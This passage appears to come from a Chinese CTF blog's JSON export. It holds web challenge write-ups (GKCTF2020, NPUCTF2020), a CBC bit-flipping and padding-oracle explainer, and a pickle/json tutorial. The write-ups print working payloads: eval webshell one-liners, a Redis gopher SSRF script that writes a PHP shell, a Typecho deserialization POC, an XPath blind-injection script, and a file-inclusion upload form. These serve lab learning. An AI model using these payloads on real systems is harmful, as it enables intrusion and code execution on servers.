false\\r\\n\\r\\n@<?php echo `find /etc -name *flag* -exec cat {} +`;\\r\\n\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"hello\\\"\\r\\n\\r\\nblacknight.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[2]\\\"\\r\\n\\r\\n222\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[1]\\\"\\r\\n\\r\\n111\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file[0]\\\"\\r\\n\\r\\n/../blacknight.php\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"submit\\\"\\r\\n\\r\\nSubmit\\r\\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\",\n  CURLOPT_HTTPHEADER => array(\n    \"Postman-Token: a23f25ff-a221-47ef-9cfc-3ef4bd560c22\",\n    \"cache-control: no-cache\",\n    \"content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\"\n  ),\n));\n\n$response = curl_exec($curl);\n$err = curl_error($curl);\n\ncurl_close($curl);\n\nif ($err) {\n  echo \"cURL Error #:\" . $err;\n} else {\n  echo $response;\n}\n```\n把flag查询语句放到中间\n全部复制下来放到php文件中上传\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717123207930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n访问即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071712322539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n信息量太大，做的我脑瓜子嗡嗡的\n","tags":["代码审计","soap_serialize_ssrf"],"categories":["buu刷题"]},{"title":"初探CBC字节翻转攻击","url":"/2020/07/15/CBC_thinking/","content":"\n前几天复现NPUCTF碰到了一道CBC字节翻转的问题，因为从来没接触过，单独学习一下\n\n<!-- more -->\n\n### CBC加密\n\n参考： [wiki百科](https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F)\n\t\t\t[CBC模式解读](https://blog.csdn.net/chengqiuming/article/details/82288851)\n\n1976年，IBM发明了**密码分组链接**（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。\n\n其加解密示意图如下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200716155435.png)\n\n若第一个块的下标为1，则CBC模式的加密过程为\n\n1. 首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。\n2. 生成一个随机的初始化向量(IV)和一个密钥。\n3. 将IV和第一组明文异或。\n4. 用密钥对3中异或后产生的密文加密。\n5. 用4中产生的密文对第二组明文进行异或操作。\n6. 用密钥对5中产生的密文加密。\n7. 重复4-7，到最后一组明文。\n8. 将IV和加密后的密文拼接在一起，得到最终的密文。\n\n而其解密过程则为\n\n1. 从密文中提取出IV，然后将密文分组。\n2. 使用密钥对第一组的密文解密，然后和IV进行异或得到明文。\n3. 使用密钥对第二组密文解密，然后和2中的密文异或得到明文。\n4. 重复2-3，直到最后一组密文。\n\nCBC是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。\n\n注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。\n\n### CBC字节翻转攻击\n\n参考： [CBC翻转攻击，了解一下！](https://blog.csdn.net/csu_vc/article/details/79619309)\n\t\t    [实验吧 简单的登录题 CBC字节翻转攻击](https://blog.csdn.net/include_heqile/article/details/79942993)\n\t\t\t[CBC字节翻转攻击](https://www.jianshu.com/p/b2e8b2819d78)\n\n攻击流程图(解密过程)\n\n![enter image description here](http://drops.xmd5.com/full/157b4078de6a8615e7c4be958d4d89164f1810e9.jpg)\n\n图中我们可以得出下一块明文Plaintext是由前一块Ciphertext产生的，如果我们改变前一块Ciphertext中的一个字节，改变后的Ciphertext和下一块解密后的密文异或处理，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就可以欺骗服务端或者绕过过滤器。\n\n### Padding oracle attack\n\n参考： [我对Padding Oracle攻击的分析和思考](https://www.freebuf.com/articles/web/15504.html)\n\t\t\t[Padding oracle attack详细解析](https://www.freebuf.com/articles/database/151167.html)\n\n看的一脸懵逼，做个简单的摘录。。。\n\n首先了解**分组密码的填充模式**，分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度，这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差4个字符，则填充0x04。这就是padding。\n\n![img](https://image.3001.net/uploads/image/20131028/20131028140730_78503.png)\n\n而这时如果最后的Padding不正确，比如显示的是0x03但只填充了两个，则解密程序往往会抛出异常(Padding Error)。利用应用的错误回显，我们就可以判断出Paddig是否正确。\n\n而Padding Oracle Attack，是一种针对CBC链接模式的攻击，和具体的加密算法无关。它的核心是通过密文的中间值从而得到正确的密文，\n\n过程：\n\n> （1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；\n>\n> （2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0x00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0x01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0x01；\n>\n> ![Padding oracle attack详细解析](https://image.3001.net/images/20171019/15083441758558.png!small)\n>\n> （3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0x01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，二就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0x01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；\n>\n> ![Padding oracle attack详细解析](https://image.3001.net/images/20171019/15083453084853.png!small)\n>\n> （4）再假定明文填充了两字节也就是明文最后两字节是0x02，接着构造倒数第二组密文，我们把M1与0x02异或可以得到填充两字节时密文的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0x00到0xff），当服务器返回值表示可以正常解密时，我们把此时的倒数第二位密文的取值与0x02异或便可得到最后一组密文倒数第二字节对应的中间值；\n>\n> （5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的密文的倒数第二位异或便可得到最后一组分组的明文；\n>\n> （6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，最后我们便可以得到全部的明文\n","tags":["CBC"],"categories":["密码学"]},{"title":"GKCTF2020部分web复现","url":"/2020/07/14/GKCTF2020_web/","content":"\n又留了两道node。。。。。留着做个综合吧。。。\n\n<!-- more -->\n\n### CheckIN\n\n打开靶机即得源码\n\n```php\n<title>Check_In</title>\n<?php \nhighlight_file(__FILE__);\nclass ClassName\n{\n        public $code = null;\n        public $decode = null;\n        function __construct()\n        {\n                $this->code = @$this->x()['Ginkgo'];\n                $this->decode = @base64_decode( $this->code );\n                @Eval($this->decode);\n        }\n\n        public function x()\n        {\n                return $_REQUEST;\n        }\n}\nnew ClassName();\n```\n\n接受get或post形式传入的Ginkgo，并base64解码执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713092724.png)\n\n#### 解题\n\n那么构造一句话，由于这里是eval执行，相当于自动加php标签，所以只要构造`eval($_POST['a']); => ZXZhbCgkX1BPU1RbJ2EnXSk7`即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093632.png)\n\n用蚁剑连上，给了个readflag的脚本，php版本是7.3，考虑[php7-gc-bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713093731.png)\n\n找个有上传权限的目录上传bypass脚本，红框内是执行的命令\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100351.png)\n\ntmp下上传\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100544.png)\n\n接着包含该文件即可bypass\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100714.png)\n\n把之前的命令改为执行readflag脚本即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713100856.png)\n\n### cve版签到\n\n给了提示是cve-2020-7066，搜集下信息\n\n> PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。\n\n 参考：https://bugs.php.net/bug.php?id=79329\n\n即get_headers()函数在一个空字节后会被无提示地截断\n\n#### 解题\n\n打开靶机提示点击view ctfhub，跳转后url如下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713103821.png)\n\n参考文章中示例构造`http://127.0.0.1\\0www.ctfhub.com`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104006.png)\n\n由于是url传入，改为%00替代空字节\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104209.png)\n\n提示了必须以123结尾，改一下即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713104528.png)\n\n### 老八小超市儿\n\n打开靶机是shopxo\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713105704.png)\n\n百度下有没有已知的漏洞\n\n找到一个后台getshell，参考文章：http://www.nctry.com/1660.html\n\n#### 解题\n\n首先用默认账号密码登录后台，admin，shopxo\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110320.png)\n\n到应用商店下载默认主题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110501.png)\n\n往压缩包里加入shell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713110824.png)\n\n找到主题安装位置上传加入shell之后的压缩包\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111006.png)\n\n访问/public/static/index/default/oneword.php即可getshell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111334.png)\n\n用蚁剑连，根目录flag下提示在root\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111524.png)\n\n但root设置了权限不可读，注意到根目录下还有一个auto.sh，查看\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111811.png)\n\n每隔一分钟执行一次makeflaghint.py，看下这个脚本\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713111929.png)\n\n获取当前时间并写入flag.hint，那么我们利用这个脚本的root权限读出root下的flag并写入到flag.hint即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113334.png)\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713113443.png)\n\n### EZ三剑客-EzWeb\n\n打开靶机只有一个提交框\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132552.png)\n\n源码处发现注释\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713132729.png)\n\n提交访问返回类似ifconfig的结果\n\n```\neth0      Link encap:Ethernet  HWaddr 02:42:ad:1f:54:0a  \n          inet addr:173.31.84.10  Bcast:173.31.84.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1\n          RX packets:34 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:6058 (6.0 KB)  TX bytes:5729 (5.7 KB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\n\n得到内网ip，访问看看\n\n会回显首页内容\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133619.png)\n\n看看内网里还有没有其他页面，burp爆破一下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713133903.png)\n\n扫到以下主机存活\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713134329.png)\n\n依次访问看看，其他没啥发现，访问11的时候提示扫它的端口\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713135357.png)\n\n太容易429了。。直接看的wp跑了一下6300-6400，发现开放了6379\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713141643.png)\n\n6379是redis的默认端口号\n\n#### 考点：Redis配合gopher协议进行SSRF\n\n未授权访问Redis服务器\n\n[参考文章](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/)\n\n直接拿的脚本，php代码执行命令结果写入shell.php\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"173.31.84.11\"#探测主机\nport=\"6379\"\nshell=\"\\n\\n<?php system(\\\"cat /flag\\\");?>\\n\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t ]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n\tCRLF=\"\\r\\n\"\n\tredis_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"*\"+str(len(redis_arr))\n\tfor x in redis_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif __name__==\"__main__\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis_format(x))\n\tprint payload\n```\n\n生成`gopher://173.31.84.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A`\n\n在输入框内输入提交，然而一直转。。。了好久，以为靶机问题中间还重启了下靶机，然后等不了手动停了，访问http://173.31.84.11/shell.php已经有了flag，嗯。。。神奇\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713144707.png)\n\n### EZ三剑客-EzTypecho\n\n题目给了源码，打开靶机是Typecho博客的安装程序但不让安装\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713163648.png)\n\n在给出源码的changelog.txt里我们可以看到源码版本\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713164514.png)\n\n百度下发现老版本有个install.php处反序列化漏洞。\n\n参考文章：https://blog.csdn.net/weixin_44005410/article/details/90385856\n\n#### 解题\n\n直接拿了参考文章师傅的poc生成payload\n\n```php\n<?php\n$CMD = 'system(\"cat /flag\")';\n \nclass Typecho_Feed\n{\n        const RSS2 = 'RSS 2.0';\n        const ATOM1 = 'ATOM 1.0';\n \n        private $_type;\n        private $_items;\n \n        public function __construct() {\n                //$this->_type = $this::RSS2;\n \n                $this->_type = $this::ATOM1;\n                $this->_items[0] = array(\n                        'category' => array(new Typecho_Request()),\n                        'author' => new Typecho_Request(),\n                );\n        }\n}\n \nclass Typecho_Request\n{\n        private $_params = array();\n        private $_filter = array();\n \n        public function __construct() {\n                $this->_params['screenName'] = $GLOBALS[CMD];\n                $this->_filter[0] = 'assert';\n        }\n}\n \n$exp = array(\n        'adapter' => new Typecho_Feed(),\n        'prefix'  => 'typecho_'\n);\n \necho base64_encode(serialize($exp));\n?>\n```\n\n然后按照文章中说的post传入payload即可，要注意一下保证referer是本站\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200713165615.png)","tags":["bypass","ssrf","Typecho","redis"],"categories":["CTF"]},{"title":"NPUCTF2020web部分复现","url":"/2020/07/12/NPUCTF2020_web/","content":"\n还有一个node和cbc字节翻转我这个菜鸡水平看不懂。。。。以后补上\n\n<!-- more -->\n\n### ReadlezPHP\n\n打开靶机源码处发现页面\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711153556.png)\n\n打开页面得到源码\n\n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\n\n两个对象创建和销毁时的魔术方法，将传入的data反序列化\n\n#### 解题\n\n由`__destruct`方法可知，会输出`$b($a)`，所以我们构造函数读取即可，用断言assert，`assert(phpinfo())`就是输出phpinfo()了\n\n```php\n<?php\nclass HelloPhp\n{\n    public $a = \"phpinfo()\";\n    public $b = \"assert\";\n}\n$c = new HelloPhp;\necho serialize($c);\n//O:8:\"HelloPhp\":2:{s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:4:\"eval\";}\n```\n\ndata传入即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154817.png)\n\nflag就在这里面\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711154914.png)\n\n\n\n### ezlogin\n\n首页是一个登录框，session存在期限\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711175219.png)\n\n抓包重放，同样重放后session失效，应当是设置了csrf-token\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711180024.png)\n\n#### 考点：xpath注入\n\n参考原文地址：[Tr0y's Blog](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)\n\n总结一下：\n\nxpath 是一门在 XML 文档中查找信息的语言。xpath注入主要分为常规注入和布尔盲注\n\n查询语句如：\n\n```\n/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\n```\n\n常规注入如下：\n\n构造万能密码传入如`admin' or '1`：(已知admin用户)\n\n```\n/root/users/user[username/text()='admin' or '1' and password/text()='\".$pwd.\"']\n```\n\n或者`' or 1 or '1\t`\n\n```\n/root/users/user[username/text()='' or 1 or '1' and password/text()='\".$pwd.\"']\n```\n\n或节点遍历`admin'] | //* | //*['`\n\n```\n/root/users/user[username/text()='admin'] | //* | //*['' and password/text()='\".$pwd.\"']\n```\n\nps：xpath 没有注释一说，所以 payload 要自行构造闭合原语句。\n\n布尔盲注payload用法主要如下：\n\n| payload                                                      |                含义                 |\n| ------------------------------------------------------------ | :---------------------------------: |\n| ' or count(/)=**1->n** or '1                                 | 判断根节点数量（n即是根节点的数目） |\n| ' or string-length(name(/*[**1->n**]))=**1->n** or '1        |      获取第n个节点的名字长度n       |\n| ' or substring(name(/*[**1->n**]), 1, 1)='**测试字符**' or '1 |         逐位获取第n个节点名         |\n\n#### 解题\n\n使用`' or substring(name(/*[1]), 1, 1)='a' or '1`猜测根节点字符\n\n当`' or substring(name(/*[1]), 1, 1)='a' or '1`时\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192100.png)\n\n当`' or substring(name(/*[1]), 1, 1)='r' or '1`时\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711192120.png)\n\n非法操作，则说明根节点的第一个字符是'r'\n\n编写脚本\n\n```python\nimport requests\nimport re\n\nurl ='http://e2f677a1-4672-4581-81d4-2e82706d0738.node3.buuoj.cn/login.php'\ns = requests.session()\n\nhead ={\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\",\n    \"Content-Type\": \"application/xml\"\n}\n\nfind =re.compile('<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />')#匹配页面token\n\nstrs ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n\nflag =''\nfor i in range(1,20):\n    print('------------------')\n    for j in strs:\n        r = s.post(url=url)\n        token = find.findall(r.text)\n        #猜测根节点名称\n        payload = \"<username>' or substring(name(/*[1]),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n        r = s.post(url=url,headers=head,data=payload)\n        if \"非法操作\" in r.text:\n            flag+=j\n            print(flag)\n            break\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711204336.png)\n\n接下来依次跑根节点以下的子节点，直到跑到username和password，替换payload即可\n\n```\n #猜测子节点名称\n payload_2 = \"<username>' or substring(name(/root/*[1]),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n \n #猜测accounts的节点\npayload_3 =\"<username>'or substring(name(/root/accounts/*[1]),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n\n#猜测user节点\npayload_4 =\"<username>'or substring(name(/root/accounts/user/*[2]),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n\n#跑用户名和密码\npayload_username =\"<username>'or substring(/root/accounts/user[2]/username/text(),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n\npayload_password =\"<username>'or substring(/root/accounts/user[2]/password/text(),{}, 1)='{}' or '1</username><password>3123</password><token>{}</token>\".format(i,j,token[0])\n```\n\n最后得到username=adm1n，password=cf7414b5bdb2e65ee43083f4ddbc4d9f，password解码md5得gtfly123\n\n登录会闪过一句话，抓包截下来是一串base64`ZmxhZyBpcyBpbiAvZmxhZwo=`解码得flag is in /flag\n\nurl是`admin.php?file=welcome`，尝试php://filter读取，发现php和base被过滤，大小写绕过\n\n得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200711211139.png)\n\n### ezinclude\n\n打开靶机只有`username/password error`，源码处发现注释\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712095830.png)\n\n随便传两个值抓包回放\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104248.png)\n\n#### 考点1：哈希长度拓展攻击\n\n哈希长度拓展攻击是利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。 \n\n可以使用工具hashpump构造payload，用法如下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712104552.png)\n\n官方wp是说可以爆破secret的长度，但这题直接给出了Md5后的hash`973225ae4fc8977f86d1a330b0774630`，也就是pass。。。。\n\n那么直接传，发现有跳转flflflflag.php\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105001.png)\n\n打开页面告诉不是flag并存在包含\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712105100.png)\n\n可以利用伪协议读取源码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712110818.png)\n\n再扫一下目录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114201.png)\n\nconfig.php还是告诉flag不在这里，dir.php列出了根目录下的文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111401.png)\n\n#### 考点2：临时文件包含（ php 7 Segment Fault ）\n\nphp代码中使用php://filter的过滤器`strip_tags` , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除\n\n参考文章：https://www.anquanke.com/post/id/201136#h2-11\n\n构造上传表单\n\n```html\n<html>\n<form action=\"http://22a3b9e5-eb32-4c8e-b130-54e4a5beb8df.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\" method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"filename\">\n    <input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n上传一句话文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712111918.png)\n\n查看dir.php，我这试了两次\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712114122.png)\n\n查看文件是否包含成功\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712113629.png)\n\n包含文件连接shell查看即可，flag就在phpinfo里\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200712132804.png)\n\n","tags":["bypass","serialize","xpath","hashpump"],"categories":["CTF"]},{"title":"python序列化和反序列化","url":"/2020/07/10/python_serialize/","content":"\npython的序列化和反序列化问题主要涉及两个模块：pickle，json\n\n<!-- more -->\n\n### Pickle\n\n翻阅手册\n\n> 模块 pickle实现了对一个 Python 对象结构的二进制序列化和反序列化。 \"pickling\" 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 \"unpickling\" 是相反的操作，会将（来自一个 binary file 或者 bytes-like object的）字节流转化回一个对象层次结构。 pickling（和 unpickling）也被称为“序列化”, “编组” 或者 “平面化”。而为了避免混乱，此处采用术语 “封存 (pickling)” 和 “解封 (unpickling)”。\n\n#### 特点\n\n- pickle所使用的数据格式仅可用于 Python\n- pickle格式使用二进制存储\n- 存储之后人类不可读\n- 存在风险\n\n#### 方法\n\n##### pickle.dump\n\n将对象序列化（即封存）并写入已打开的文件中。\n\n示例：\n\n```python\nimport pickle\n\nf = open('test.txt','wb')  \ndata = {'e1':'python','e2':'serialize','e3':'is','e4':'good'}\npickle.dump(data,f)\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710134953.png)\n\n##### pickle.dumps\n\n将对象序列化\n\n示例：\n\n```python\nimport pickle\n \ndata = {'e1':'python','e2':'serialize','e3':'is','e4':'good'}\nresult = pickle.dumps(data)\nprint(result)\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135217.png)\n\n##### pickle.load\n\n从文件中读取序列化字符串并反序列化\n\n示例：\n\n```python\nimport pickle\n\nf = open('test.txt','rb')\nresult = pickle.load(f)\nprint(result)\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135647.png)\n\n##### pickle.loads\n\n将序列化字符串反序列化\n\n示例：\n\n```python\nimport pickle\n \ndata = {'e1':'python','e2':'serialize','e3':'is','e4':'good'}\nresult = pickle.dumps(data)\nprint(result)\nreverse = pickle.loads(result)\nprint(reverse)\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135849.png)\n\n### Json\n\n> JSON (JavaScript Object Notation)，是一个受 JavaScript 的对象字面量语法启发的轻量级数据交换格式，尽管它不仅仅是一个严格意义上的 JavaScript 的字集 。\n\nJSON序列化：将Python内置的数据类型序列化为JSON格式，用来数据存储或数据交换。\n\n#### 特点\n\n- 人类可读\n- 采用文本序列化格式，输出 unicode 文本\n- 可互操作，在Python系统之外广泛使用\n- 相比pickle较为安全\n\n#### 方法\n\n方法名和pickle相同，但主要是类型的转换\n\n##### json.dumps\n\n将dict类型的数据转成str\n\n示例：\n\n```python\nimport json  \n  \ndata = {'name':'python','sex':'boy','age':18}  \n      \nresult = json.dumps(data)   \n\nprint(type(data))\nprint(result)\nprint(type(result))\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150440.png)\n\n##### json.dump\n\n将dict类型的数据转换类型，并写入到json文件中\n\n示例：\n\n```python\nimport json  \n  \ndata = {'name':'python','sex':'boy','age':18}  \n      \nfiletest = ('test.txt')  \n\nresult = json.dumps(data)   \nwith open(filetest, \"w\") as f:  \n  f.write(result)  \n  f.close()  \n  \njson.dump(data, open(filetest, \"w\")) \n```\n\n写入前需先dumps转换成类型，直接存入会报错\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150639.png)\n\n##### 